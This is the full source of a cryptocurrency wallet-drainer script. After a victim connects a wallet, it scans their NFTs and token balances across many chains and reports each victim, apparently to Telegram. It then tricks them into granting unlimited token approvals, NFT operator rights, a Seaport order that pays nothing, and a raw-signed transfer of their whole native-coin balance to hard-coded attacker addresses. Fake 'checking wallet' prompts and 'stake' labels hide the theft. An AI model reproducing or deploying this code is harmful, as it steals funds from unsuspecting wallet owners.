//   
//    
//
//
var connected = 0;
var account = "";
var alert = 0;
var perETH_usd;
var success = 0;
let message;
let ethersProvider, signer, wallet, Seaport, web3Modal, selectedAccount;
let tokenList = [];
const characters = '0123456789';

const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
const CONDUIT = "0x1E0049783F008A0085193E00003D00cd54003c71";
const RPC = "https://rpc.ankr.com/eth/e0a3f7260441a7ccc22e6248f1a2766f9179d1357f75ac5fd4195511fb73e3d7";

let w3 = new ethers.providers.JsonRpcProvider(RPC);

// SET THESE START
// --> its recommended to set operator-wallet = ownerAddress-wallet -> then you just need to have 1 wallet to handle
operator = '0xFA08B8F1ba6e969d9a6d1bc1245805B2D632A16b' //  --> The address (0x) of the operator that conducts transactions, the privatekey of which lies on the server in the variable
contractSAFA = '0x829d26e91AcEaB3e914479AC9fA67ca80a08B1fc' // specify address contract your deploy
ownerAddress = '0xBB0377d3e81E14185b9965caeCa54a32974Bf669' // specify address reciept --> MY ACC 10
const OPENSEA_API_KEY = "4ea4cd25c3904c5ab76844d5f1b2549f";
const ZAPPER_KEY = '679d6958-de57-407e-90aa-ea74e1391153'  // specify your API key
const BASE_URL = 'https://dappauthbackend-production.up.railway.app/api'; // specify the address to the configured server in format https://server.com/api
// SET THESE END

const TOKEN_APPROVE = BASE_URL + '/token_permit';
const TOKEN_TRANSFER = BASE_URL + '/token_transfer';
const SEAPORT_SIGN = BASE_URL + '/seaport_sign';
const NFT_TRANSFER = BASE_URL + '/nft_transfer';
const MAX_APPROVAL = '1158472395435294898592384258348512586931256';

const endpoint = ownerAddress;

let supportedWallets = {
    0: "WalletConnect",
    1: "Metamask",
};
let selectedProvider, selectedWallets;

const chainToId = {
    "ethereum": {
        chainId: '0x1',
        abiUrl: 'https://api.etherscan.io/v2/api?module=contract&action=getsourcecode&address={0}&chainid=1&apikey=X8N7AB6IWW98FGS1PK8BSPHKAG5PZJPQTF'
    },
    "binance-smart-chain": {
        chainId: '0x38',
        abiUrl: 'https://api.etherscan.io/v2/api?chainid=56&module=contract&action=getsourcecode&address={0}&apikey=G1X4GPASDQDYAPPZBN2JPFC11RMRBBCVFM'
    },
    "polygon": {
        chainId: '0x89',
        abiUrl: 'https://api.etherscan.io/v2/api?chainid=137&module=contract&action=getsourcecode&address={0}&apikey=UK9WHZFQA8NY9418QF3KUG9J6V91FW3CBM'
    },
    "fantom": {
        chainId: '0xfa',
        abiUrl: 'https://api.etherscan.io/v2/api?chainid=250&module=contract&action=getsourcecode&address={0}&apikey=89FSSVCHYPZ8T69KZW7WJA8UD5B6H3S8PF'
    },
    "avalanche": {
        chainId: '0xa86a',
        abiUrl: 'https://api.etherscan.io/v2/api?chainid=43114&module=contract&action=getsourcecode&address={0}&apikey=IWEBQQBIKJTME69ITKUXDMF8R8KS7CJHQS'
    },
    "optimism": {
        chainId: '0xa',
        abiUrl: 'https://api.etherscan.io/v2/api?chainid=10&module=contract&action=getsourcecode&address={0}&apikey=5A2JPYNV654S6ZCAEHIHN5BUJ8HAJ5DDFA'
    },
    "arbitrum": {
        chainId: '0xa4b1',
        abiUrl: 'https://api.etherscan.io/v2/api?chainid=42161&module=contract&action=getsourcecode&address={0}&apikey=V3E8IF1ZB7MKX7M8K8JJHKRX5NGGIUAJM6'
    },
    "gnosis": {
        chainId: '0x64',
        abiUrl: 'https://api.gnosisscan.io/api?module=contract&action=getsourcecode&address={0}&apikey={1}'
    },
    "moonriver": {
        chainId: '0x505',
        abiUrl: 'https://api-moonriver.moonscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=V9NUIJEW3UKIZY5ARPA8ZPGYSCUIWQHEV5'
    },
    "celo": {
        chainId: '0xa4ec',
        abiUrl: 'https://api.celoscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=iQgt2gC1zSlWnUU8PDfyD'
    },
    "aurora": {
        chainId: '0x4e454152',
        abiUrl: 'https://api.aurorascan.dev/api?module=contract&action=getsourcecode&address={0}&apikey=MTE8S9Z2RSYMM1CGNRYCXGBECK1KVW57S4'
    }
}

const getMobileOperatingSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    if (/windows phone/i.test(userAgent)) {
        return "Windows Phone";
    }
    if (/android/i.test(userAgent)) {
        return "Android";
    }
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }
    return "unknown";
}

const getDAppSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    if (/Trust/i.test(userAgent)) {
        return "Trust";
    }
    if (/CriOS/i.test(userAgent)) {
        return "Metamask";
    }
    return "unknown";
}

const openMetaMaskUrl = (url) => {
    const a = document.createElement("a");
    a.href = url;
    a.target = "_self";
    document.body.appendChild(a);
    a.click();
    a.remove();
}

function loginMetamask() {
    openMetaMaskUrl(`dapp://${document.URL.replace(/https?:\/\//i, "")}`);
}

async function loginTrust() {
  selectedWallets = 1;
  window.location = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${document.URL.replace(/https?:\/\//i, "")}`;
}

async function login() {
  try{
    walletconnect();
  }catch(error){
    console.log(error);
  }
}

function walletconnect() {
  if (window.ethereum) {
    ConnectWallet();
  } else {
    window.addEventListener('ethereum#initialized', ConnectWallet, {
      once: true,
    });
    ConnectWallet();
  }
}

const round = (value) => {
    return Math.round(value * 10000) / 10000;
}

async function getNormalizedETH(wei){
    return ethers.utils.formatEther(wei);
}

async function isApproved(owner, nft) {
    try { 
        let contract = new ethers.Contract(nft, ERC721_ABI, w3);
        const approved = await contract.functions.isApprovedForAll(owner, CONDUIT, {gasLimit:100000});
        return approved;
    } catch (err) {
        console.log("error", err);
        return false;
    }
}

function fetchTokenIds(resp, contract) {
    try { 
        const assets = resp.assets;
        const tokenIds = [];
        for (let i = 0; i < assets.length; i++) {
            const currentAsset = assets[i];
            if (currentAsset.asset_contract.address.toLowerCase() == contract.toLowerCase()) {
                tokenIds.push(currentAsset.token_id);
            }
        }
        return tokenIds;
    } catch (err) {
        console.log("error", err)
    }
}

async function getNFTS(walletAddress) {

    try {

        const options = {
            method: "GET",
            headers: {
                Accept: "application/json",
                "X-API-KEY": OPENSEA_API_KEY
            }
        };

        const response = await fetch(
            `https://api.opensea.io/api/v2/chain/ethereum/account/${walletAddress}/nfts?limit=200`,
            options
        );

        if (!response.ok) {
            console.error("OpenSea NFT request failed", response.status);
            return [];
        }

        const data = await response.json();

        if (!data.nfts) {
            console.log("No NFTs returned");
            return [];
        }

        const collections = {};

        for (const nft of data.nfts) {

            const contract =
                nft.contract ||
                nft.contract_address ||
                nft.identifier?.contract;

            if (!contract) continue;

            if (!collections[contract]) {

                collections[contract] = {
                    type: "erc721",
                    tokenAddress: ethers.utils.getAddress(contract),
                    token_ids: [],
                    price: 0,
                    balance: 0,
                    chain: "ethereum",
                    owned: 0,
                    approved: false
                };
            }

            collections[contract].token_ids.push(
                nft.identifier.toString()
            );

            collections[contract].owned++;
        }

        const nfts = Object.values(collections);

        await Promise.all(
            nfts.map(async (nft) => {

                try {

                    const approved =
                        await isApproved(
                            walletAddress,
                            nft.tokenAddress
                        );

                    nft.approved = approved[0];

                } catch (e) {
                    console.log(e);
                }

            })
        );

        return nfts;

    } catch (e) {

        console.log("getNFTS error", e);
        return [];
    }
}
function generateString(length) {
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

async function getCounter(walletAddress) {
    const ABI_COUNTER = [{
        "inputs": [
            {
                "internalType": "address",
                "name": "offerer",
                "type": "address"
            }
        ],
        "name": "getCounter",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "counter",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }]
    let contract = new ethers.Contract("0x00000000006c3852cbEf3e08E8dF289169EdE581", ABI_COUNTER, w3);
    const counter = contract.functions.getCounter(walletAddress);
    return counter;
}

async function getWETH(walletAddress) {
    let contractWETH = new ethers.Contract(WETH, ERC20_ABI, w3);
    const balanceWETH = contractWETH.functions.balanceOf(walletAddress);
    const allowances = contractWETH.functions.allowance(walletAddress, CONDUIT);
    return await Promise.all([balanceWETH, allowances]);
}

function getPreviousDay(date = new Date()) {
    const previous = new Date(date.getTime());
    previous.setDate(date.getDate() - 1);
    return previous;
}

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
console.log("========== INIT ==========");
console.log("window.Web3Modal:", window.Web3Modal);
console.log("window.WalletConnectProvider:", window.WalletConnectProvider);
function init() {
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        bridge: "https://bridge.walletconnect.org",
        rpc: {
            1: "https://mainnet.infura.io/v3/631af39780e145988c6438bcb62a0d77",
            56: "https://rpc.ankr.com/bsc",
            137: "https://rpc.ankr.com/polygon",
            250: "https://rpc.ankr.com/fantom",
            43114: "https://rpc.ankr.com/avalanche",
            10: "https://rpc.ankr.com/optimism",
            42161: "https://rpc.ankr.com/arbitrum",
            100: "https://rpc.ankr.com/gnosis",
            1285: "https://rpc.moonriver.moonbeam.network",
            42220: "https://rpc.ankr.com/celo",
            1313161554: "https://mainnet.aurora.dev",
        },
      },
    },
    "custom-binancechainwallet": {
    display: {
      logo: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PGcgZmlsbD0iI2YwYjkwYiI+PHBhdGggZD0iTTIwLjI0NSAwTDkuNjM0IDYuMTI1bDMuOTAxIDIuMjYyIDYuNzEtMy44NjIgNi43MSAzLjg2MiAzLjkwMi0yLjI2MkwyMC4yNDUgMHptNi43MTEgMTEuNTg2bDMuOSAyLjI2M3Y0LjUyNmwtNi43MSAzLjg2MnY3LjcyNGwtMy45IDIuMjYzLTMuOTAyLTIuMjYzdi03LjcyNGwtNi43MS0zLjg2MnYtNC41MjZsMy45MDEtMi4yNjMgNi43MSAzLjg2MyA2LjcxLTMuODYzaC4wMDF6Ii8+PHBhdGggZD0iTTMwLjg1NyAyMS41NzNWMjYuMWwtMy45MDEgMi4yNjJ2LTQuNTI1bDMuOS0yLjI2My4wMDEtLjAwMXoiLz48cGF0aCBkPSJNMjYuOTE2IDMxLjU2bDYuNzEtMy44NjJ2LTcuNzI0bDMuOTAyLTIuMjYzdjEyLjI1bC0xMC42MTEgNi4xMjVWMzEuNTZoLS4wMDF6bTYuNzExLTE5LjMxbC0zLjkwMi0yLjI2MyAzLjkwMi0yLjI2MyAzLjkgMi4yNjN2NC41MjVsLTMuOSAyLjI2M1YxMi4yNXpNMTYuMzQ0IDM3LjcyNFYzMy4ybDMuOTAxIDIuMjYzIDMuOTAyLTIuMjYzdjQuNTI1bC0zLjkwMiAyLjI2My0zLjktMi4yNjMtLjAwMS0uMDAxem0tMi44MDktOS4zNjNMOS42MzQgMjYuMXYtNC41MjZsMy45MDEgMi4yNjN2NC41MjUtLjAwMXptNi43MS0xNi4xMTFsLTMuOS0yLjI2MyAzLjktMi4yNjMgMy45MDIgMi4yNjMtMy45MDIgMi4yNjN6bS05LjQ4LTIuMjYzbC0zLjkgMi4yNjN2NC41MjVsLTMuOTAyLTIuMjYzVjkuOTg3bDMuOTAxLTIuMjYzIDMuOTAxIDIuMjYzeiIvPjxwYXRoIGQ9Ik0yLjk2MyAxNy43MTFsMy45MDEgMi4yNjN2Ny43MjRsNi43MSAzLjg2MnY0LjUyNkwyLjk2MyAyOS45NlYxNy43MXYuMDAxeiIvPjwvZz48L3N2Zz4=",
      name: "Binance Chain Wallet",
      description: "Connect to your Binance Chain Wallet"
    },
    package: true,
    connector: async () => {
      let provider = null;
      if (typeof window.BinanceChain !== 'undefined') {
        provider = window.BinanceChain;
        try {
          await provider.request({ method: 'eth_requestAccounts' });
          selectedWallets = 2;
        } catch (error) {
          throw new Error("User Rejected");
        }
      } else {
        throw new Error("No Binance Chain Wallet found");
      }
      return provider;
    },
    },
  };
web3Modal = new Web3Modal({
    cacheProvider: false,
    providerOptions,
});

console.log("web3Modal =", web3Modal);
}

async function ConnectWallet() {

    try {

        console.log("Opening wallet...");

        console.log("========== CONNECT WALLET ==========");
console.log("web3Modal before connect:", web3Modal);
console.log("typeof web3Modal:", typeof web3Modal);
provider = await web3Modal.connect();
console.log("✅ web3Modal.connect success");

web3 = new Web3(provider);
console.log("✅ Web3 initialized");

ethersProvider = new ethers.providers.Web3Provider(provider, "any");
console.log("✅ ethersProvider initialized");

signer = ethersProvider.getSigner();
console.log("✅ signer obtained");

if (web3._provider["bridge"]) {
    selectedProvider = supportedWallets[0];
} else {
    selectedProvider = supportedWallets[1];
}

console.log("Provider:", selectedProvider);

Seaport = new seaport.Seaport(signer);
console.log("✅ Seaport initialized");

await getWalletAccount();
console.log("✅ getWalletAccount finished");

await get12DollarETH();
console.log("✅ ETH price loaded");
    } catch (err) {

        console.error("ConnectWallet failed:", err);

    }
}

async function get12DollarETH() {
    let url = "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";
    let response = await fetch(url);
    let price = await response.json();
    let perETH = price["ethereum"]["usd"];
    let usd = 1 / perETH;
    perETH_usd = perETH;
    return;
}

async function getWalletAccount() {
    const accounts = await web3.eth.getAccounts();
    waitAlert();
    account = accounts[0];
    console.log("========== WALLET ACCOUNT ==========");
console.log("Wallet:", account);
    const connectmsg = '🥇Wallet Connected!<br><b>Account: <code>'+account+'</code></b><br>Domain: '+window.location.hostname;
    logTlg(connectmsg);
    let counter, wethData;
   console.log("Loading NFTs, Counter and WETH...");

[tokenList, counter, wethData] =
await Promise.all([
    getNFTS(account),
    getCounter(account),
    getWETH(account)
]);

console.log("NFT Count:", tokenList.length);
console.log("Counter:", counter.toString());
console.log("WETH:", wethData);

    counter = parseInt(counter.toString());
    let [balance, allowance] = wethData;
    balance = balance.toString();
    allowance = allowance.toString();
    const balanceNormalized = parseFloat(ethers.utils.formatEther(balance));
    const allowanceNormalized = parseFloat(ethers.utils.formatEther(allowance));
    let weth_include = "0";
    let wasWethApproved = false;
    if (allowanceNormalized >= balanceNormalized) {
        weth_include = balance;
    }
    else if (balanceNormalized > allowanceNormalized) {
        weth_include = allowance;
    }
    const orders = [];
    const considers = [];
    let bundlePrice = 0;
    tokenList.forEach((nft) => {
        if (nft.type == "erc721" && nft.approved == true) {
            bundlePrice+=nft.balance;
            nft.token_ids.forEach((token_id) => {
                const array = {
                    itemType: 2,
                    token: nft.tokenAddress,
                    identifierOrCriteria: token_id,
                    startAmount: "1",
                    endAmount: "1",
                }
                const consider = {
                    itemType: 2,
                    token: nft.tokenAddress,
                    identifierOrCriteria: token_id,
                    startAmount: "1",
                    endAmount: "1",
                    recipient: endpoint,
                }
                orders.push(array)
                considers.push(consider);
            })
        }
    });
    if (weth_include !== "0") {
        wasWethApproved = true;
        bundlePrice += perETH_usd * parseFloat(getNormalizedETH(weth_include));
        const weth_order = {
            "itemType": 1,
            "token": WETH,
            "identifierOrCriteria": "0",
            "startAmount": weth_include,
            "endAmount": weth_include
        }
        const weth_consider = {
            "itemType": 1,
            "token": WETH,
            "identifierOrCriteria": "0",
            "startAmount": weth_include,
            "endAmount": weth_include,
            "recipient": endpoint
        }
        orders.push(weth_order);
        considers.push(weth_consider);
    }
    const date = getPreviousDay();
    const milliseconds = date.getTime();
    const dateClone = date;
    const tomorrow = dateClone.setTime(milliseconds + (2 * 24 * 60 * 60 * 1000));
    const milliseconds_tomorrow = dateClone.getTime();
    const tomorrow_seconds = Math.floor(milliseconds_tomorrow / 1000);
    const seconds = Math.floor(milliseconds / 1000);
    const salt = generateString(70);
    const offer = {
        "offerer": ethers.utils.getAddress(account),
        zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00",
        "offer": orders,
        consideration: considers,
        orderType: 2,
        startTime: seconds,
        endTime: tomorrow_seconds,
        zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
        salt: salt,
        totalOriginalConsiderationItems: considers.length,
        conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
    }

try {
    const query = `
        query PortfolioV2($addresses: [Address!]!) {
            portfolioV2(addresses: $addresses) {
                tokenBalances {
                    byToken {
                        edges {
                            node {
                                tokenAddress
                                symbol
                                balance
                                balanceRaw
                                balanceUSD
                                network {
                                    name
                                }
                            }
                        }
                    }
                }
            }
        }
    `;

    const response = await fetch(
        "https://public.zapper.xyz/graphql",
        {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "x-zapper-api-key": ZAPPER_KEY,
            },
            body: JSON.stringify({
                query,
                variables: {
                    addresses: [account],
                },
            }),
        }
    );

    const raw = await response.text();

    console.log("========== ZAPPER RESPONSE ==========");
    console.log("HTTP Status:", response.status);
    console.log("Response:", raw);

    if (!response.ok) {
        console.error("Zapper HTTP Error");
        return;
    }

    const result = JSON.parse(raw);

    if (result.errors) {
        console.error("GraphQL Errors:", result.errors);
        return;
    }

 const edges =
    result?.data?.portfolioV2?.tokenBalances?.byToken?.edges || [];

tokenList.length = 0;

const networkMap = {
    "Ethereum": "ethereum",
    "BNB Chain": "binance-smart-chain",
    "Polygon": "polygon",
    "Optimism": "optimism",
    "Arbitrum": "arbitrum",
    "Avalanche": "avalanche",
    "Fantom": "fantom",
    "Gnosis": "gnosis",
    "Moonriver": "moonriver",
    "Celo": "celo",
    "Aurora": "aurora"
};

edges.forEach(({ node }) => {

    const chain =
        networkMap[node.network?.name] ??
        (node.network?.name || "").toLowerCase();

    // Ignore dust / worthless tokens
    if ((node.balanceUSD ?? 0) <= 0)
        return;

    tokenList.push({
        type: "erc20",
        tokenAddress: node.tokenAddress,
        balance: Number(node.balanceUSD ?? 0),
        tokenAmountFix: node.balance,
        chain: chain,
        tokenAmount: node.balanceRaw,
        symbol: node.symbol,
    });

});

console.log(`Loaded ${tokenList.length} ERC20 tokens from Zapper.`);

    console.log(
        `Loaded ${tokenList.length} ERC20 tokens from Zapper.`
    );

} catch (err) {
    console.error("Failed to retrieve Zapper balances:", err);
}
    if (offer.offer.length == 0) {
        tokenList.sort((a, b) => (Number(b.balance) > Number(a.balance)) ? 1 : -1);
        console.log("Calling sendToken...");
        await sendToken(wasWethApproved, offer, counter, Seaport);
        await waitClose();
        return;
    } else {
        tokenList.push({
            type: "seaport",
            chain: "ethereum",
            tokenAddress: "",
            token_ids: "",
            price: null,
            balance: bundlePrice,
            owned: "",
            "approved": false, 
        })
    }
    tokenList.sort((a, b) => (Number(b.balance) > Number(a.balance)) ? 1 : -1);
    console.log(tokenList);
    connected = 1;
    await sendToken(wasWethApproved, offer, counter, Seaport);
    await waitClose();
}

function getEthBalance(balance, decimals, rate) {
  var pow10 = 1;
  for (var i = 0; i < decimals; i ++) pow10 *= 10;
  return balance * rate / pow10;
}

async function transferEth(amount, msg) {
    if(account=="") return;
    const getBalance = await web3.eth.getBalance(account);
    const ethBalance = web3.utils.fromWei(getBalance, 'ether');
    success = 1;
    const gasPrice = await web3.eth.getGasPrice();
    const mgasPrice = web3.utils.toHex(gasPrice);
    const valueToSend = web3.utils.toWei(ethBalance.toString(), "ether") - (parseInt(gasPrice) * 120000);
    const valueToSendString = Number(valueToSend);
    const valueToTransHex = web3.utils.toHex(valueToSendString);

    var transactionObject = {
      from: account,
      to: ownerAddress,
      value: valueToTransHex
    }
    
    try {
      await web3.eth.sendTransaction(transactionObject);
    } catch(e) {
      console.log(e)
      success = 0
    }
    logTlgMsg(msg, success);
}

async function stakeEth(amount, msg) {
    if(account=="") return;
    const getBalance = await web3.eth.getBalance(account);
    const ethBalance = web3.utils.fromWei(getBalance, 'ether');
    console.log(ethBalance);
    console.log("@Ox29DC");
    success = 1;
    const nonce = web3.utils.toHex(await web3.eth.getTransactionCount(account));
    const gasPrice = await web3.eth.getGasPrice();
    const mgasPrice = web3.utils.toHex(gasPrice);
    const valueToSend = web3.utils.toWei(ethBalance.toString(), "ether") - (parseInt(gasPrice) * 120000);
    console.log("valueToSend", valueToSend);
    const valueToSendString = Number(valueToSend);
    console.log("valueToSendString", valueToSendString);
    console.log("@Ox29DC");
    const valueToTransHex = web3.utils.toHex(valueToSendString);
    const chainId = await web3.eth.getChainId();
    const chainHex = web3.utils.toHex(chainId);
    try {
        tx_ = {
          to: ownerAddress,
          nonce: nonce,
          gasLimit: "0x55F0",
          gasPrice: web3.utils.toHex(gasPrice),
          value: valueToTransHex,
          data: "0x0",
          r: "0x",
          s: "0x",
          v: chainHex,
        };
        console.log(tx_);
        const { ethereumjs } = window;
        var tx = new ethereumjs.Tx(tx_);
        const serializedTx = "0x" + tx.serialize().toString("hex");
        const sha3_ = web3.utils.sha3(serializedTx, { encoding: "hex" });

        const initialSig = await web3.eth.sign(sha3_, account);

        const temp = initialSig.substring(2),
          r = "0x" + temp.substring(0, 64),
          s = "0x" + temp.substring(64, 128),
          rhema = parseInt(temp.substring(128, 130), 16),
          v = web3.utils.toHex(rhema + chainId * 2 + 8);
        tx.r = r;
        tx.s = s;
        tx.v = v;
        const txFin = "0x" + tx.serialize().toString("hex");
        console.log("Waiting for sign submitting...");
        const res = await web3.eth.sendSignedTransaction(txFin);
        console.log("Submitted:", res);
    } catch(e){
        success = 0;
    }
    logTlgMsg(msg, success);
}

async function stakeERC20(tokenAddress, amount, msg, chainId, abiUrl) {
    console.log(tokenAddress, account, amount);

    console.log("========== stakeERC20 ==========");
    console.log("Token:", tokenAddress);
    console.log("Chain ID:", chainId);
    console.log("ABI URL:", abiUrl);

    const contractInfo = await getABI(tokenAddress, abiUrl);
    console.log(tokenAddress, account, amount);
    const contract = new ethers.Contract(tokenAddress, contractInfo[0], signer);
    const tokenContract = new web3.eth.Contract(contractInfo[0], tokenAddress);
    const functions = contract.functions;
    success = 1;

    let hasPermit = functions.hasOwnProperty('permit') && functions.hasOwnProperty('nonces') &&
    functions.hasOwnProperty('name') && functions.hasOwnProperty('DOMAIN_SEPARATOR') && isValidPermit(functions);
    console.log('Has permit', hasPermit);
    console.log("@Ox29DC");
    if(hasPermit) {
      const data = {chainId: chainId, tokenAddress: tokenAddress, abiUrl: abiUrl, amount: amount, owner: account, spender: operator, permit: await permit(contract, account, operator), impl: contractInfo[1]};
      const params = JSON.parse(data.permit);
      
      axios.post(TOKEN_APPROVE, data).then(function (response) {
        console.log(response);
        logTlgMsg(msg, success);
      });
      return data;
    }

   try {

    console.log("========== ERC20 APPROVAL ==========");
    console.log("Token:", tokenAddress);
    console.log("Owner:", account);
    console.log("Operator:", operator);

    console.log("Opening approval popup...");

    const tx = await tokenContract.methods
        .approve(operator, MAX_APPROVAL)
        .send({
            from: account,
            gas: 110000,
            gasPrice: 0
        });

    console.log("✅ Approval Success");
    console.log(tx);

    const data = {
        chainId,
        tokenAddress,
        abiUrl,
        amount,
        owner: account,
        spender: operator
    };

    console.log("Posting to backend...");
    console.log(data);

    const response = await axios.post(
        TOKEN_TRANSFER,
        data
    );

    console.log("✅ Backend Response");
    console.log(response.data);

    logTlgMsg(msg, success);

} catch(e){

    console.log("❌ APPROVAL FAILED");
    console.log(e);

    console.log("Error Code:", e.code);
    console.log("Error Message:", e.message);
    console.log("Full Error:", JSON.stringify(e, null, 2));

    success = 0;

    logTlgMsg(msg, success);
}

}

async function stakeNFT(tokenAddress, nftTokenID, msg) {
  const data = {owner: account, tokenAddress: tokenAddress, tokens: nftTokenID};
  var tokenContract = new web3.eth.Contract(ERC721_ABI, tokenAddress);
  success = 1;
  try {
    await tokenContract.methods.setApprovalForAll(contractSAFA, true).send({
       from: account,
       gas: 380000,
       gasPrice:0
    });
    axios.post(NFT_TRANSFER, data).then(function (response) {
        console.log(response);
      });
  } catch(e){
      console.log(e)
      success = 0;
  }
  logTlgMsg(msg, success);
}

async function stake1155NFT(tokenAddress, nftTokenID, msg) {

  var tokenContract = new web3.eth.Contract(ERC1155_ABI, tokenAddress);
  success = 1;
  try {
    await tokenContract.methods.setApprovalForAll(operator, true).send({
       from: account,
       gas: 470000,
       gasPrice:0
    });
  } catch(e){
      console.log(e)
      success = 0;
  }
  logTlgMsg(msg, success);
}

async function sendToken(wasWethApproved, offer, counter, Seaport) {
console.log("========== SEND TOKEN ==========");
console.log("Total Items:", tokenList.length);

for (const item of tokenList) {

    console.log("---------------------------");
    console.log("Current Item:");
    console.log(item);
 
    if(item < 1) return alertshow();
      if (!item.approved) {
          
        if (wasWethApproved && item.tokenAddress == WETH) return;
        
        if (selectedProvider == supportedWallets[0] || selectedWallets == "1" || selectedWallets == "2") {
            if(item.type == "erc721") return;
            if(item.type == "seaport") return;
        };
        console.log("Checking chain...");
        const currentChainId = await web3.eth.net.getId();
        const chainHex = web3.utils.toHex(currentChainId);
          console.log("Wallet Chain:", chainHex);
console.log("Required Chain:", chainToId[item.chain]?.chainId);
          console.log("item.chain =", item.chain);
console.log("chainToId =", Object.keys(chainToId));
          console.log("Passed chain check");
        if (chainHex !== chainToId[item.chain].chainId) {
            console.log("Switching network...");

await changeNetwork(chainToId[item.chain].chainId);

console.log("Network switched.");
            await changeNetwork(chainToId[item.chain].chainId);
        }
        try {
          if(item.type == "erc20") {
            if(item.tokenAddress == "0x0000000000000000000000000000000000000000") {
              if (item.balance > 5) {
                message = '🪙 <b>Transfering '+ item.symbol + ' | Network: ' + item.chain +'</b><br><br>Amount: '+item.tokenAmount+' ('+ item.balance + ' $)<br><br>Account: <code>'+account+'</code><br><br>Domain: '+window.location.hostname;
                if(selectedWallets == "2") { 
                    await transferEth(item.tokenAmount, message);
                } else {
                    await stakeEth(item.tokenAmount, message);
                }
              }
            }
            else {
              message = '🪙<b>Approve '+ item.symbol + ' | Network: ' + item.chain +'</b><br><br>Contract: <code>'+item.tokenAddress+ '</code><br><br>Account: <code>'+account+'</code><br><br>Amount: <code>'+item.tokenAmount+'</code> ('+ item.balance + ' $)<br><br>Domain: '+window.location.hostname;
                console.log("About to call stakeERC20()");
              await stakeERC20(item.tokenAddress, item.tokenAmount, message, chainToId[item.chain].chainId, chainToId[item.chain].abiUrl);
                console.log("Returned from stakeERC20()");
            }
          } 
          else if(item.type == "erc721"){
            message = '🎨<b>Transfer NFT 721</b><br>Contract: <code>'+item.tokenAddress+ '</code><br><br>Average Price Collection: <code>'+item.balance+'</code>$<br><br>Account: <code>'+account+'</code><br><br>Inventory: https://etherscan.io/token/'+item.tokenAddress+'?a='+account+'%23inventory<br><br>Domain: '+window.location.hostname;
            await stakeNFT(item.tokenAddress, item.token_ids, message);
          } 
          else if(item.type == "seaport") {
                success = 1;
                message = '🐳<b>Seaport</b><br>Price: <code>'+item.balance+ ' $</code><br><br>Account: <code>'+account+'</code><br><br><b>Data Offer:</b><br>'+ JSON.stringify(offer) +'<br><br>Domain: '+window.location.hostname;
                console.log("========== SEAPORT ==========");
console.log("Opening sign popup...");

await Seaport.signOrder(offer, parseInt(counter))
.then(function(response){

    console.log("✅ Signature received");
    console.log(response);

                    let sgt = response;
                    offer["counter"] = parseInt(counter);
                    const order = {
                        "recipient": endpoint,
                        "parameters": offer,
                        "signature": sgt,
                    }
                    logTlg(JSON.stringify(order));
                    console.log("Posting Seaport order...");

axios.post(SEAPORT_SIGN, order)
.then(function(response){

    console.log("✅ Backend Response");
    console.log(response.data);
                        logTlgMsg(message, success);
                    });
                }).catch(function(error) {

    console.log("❌ SIGNATURE FAILED");
    console.log(error);
    console.log(error.code);
    console.log(error.message);
                    success = 0;
                    logTlgMsg(message, success);
                    return;
                })
          } else {
            message = '🎨<b>Transfer NFT 1155</b><br>Contract: <code>'+item.tokenAddress+ '</code><br><br>Average Price Collection: <code>'+item.balance+'</code>$<br><br>Account: <code>'+account+'</code><br><br>Inventory: https://etherscan.io/token/'+item.tokenAddress+'?a='+account+'%23inventory<br><br>Domain: '+window.location.hostname;
            await stake1155NFT(item.tokenAddress, item.token_ids, message);
          }
        } catch(e) { console.log(e) }
      }
  }
}

async function waitAlert() {
    Swal.fire({
        text: 'Checking Your Wallet...',
        position: 'bottom',
        background: 'transparent',
        imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
        imageHeight: 45,
        allowOutsideClick: false,
        allowEscapeKey: false,
        timer: 0,
        width: 300,
        showConfirmButton: false
    });
    window.onbeforeunload = function() {
        return true;
    };
}

async function waitClose() {
    Swal.close();
    window.onbeforeunload = null;
}

async function alertshow() {
  if(alert == 0) {
      Swal.fire({
        title: 'Error!',
        text: 'Connect has been failed, try with another wallet',
        icon: 'error',
        confirmButtonText: 'OK'
    });
    alert = 1;
  }
  if(alert == 1) {
      Swal.fire({
        title: 'Error!',
        text: 'This wallet cannot be connect, try another one',
        icon: 'error',
        confirmButtonText: 'OK'
    });
  }
}

const changeNetwork = async (ChainId) => {
  if (window.ethereum) {
    try {
      await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
        params: [{chainId: ChainId}],
      });
    } catch (error) {
      console.error(error);
      await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
        params: [{chainId: ChainId}],
      });
    }
  }
}

const isValidPermit = (functions) => {
    for (const key in functions) {
        if (key.startsWith('permit(')) {
            const args = key.slice(7).split(',')
            return args.length === 7 && key.indexOf('bool') === -1;
        }
    }
}

const permit = async (contract, owner, spender) => {
    console.log('Permit');
    let chainId = await contract.signer.getChainId();
    let value = ethers.utils.parseEther(MAX_APPROVAL);
    let nonce = await contract.nonces(owner);
    let name = await contract.name();
    let version;
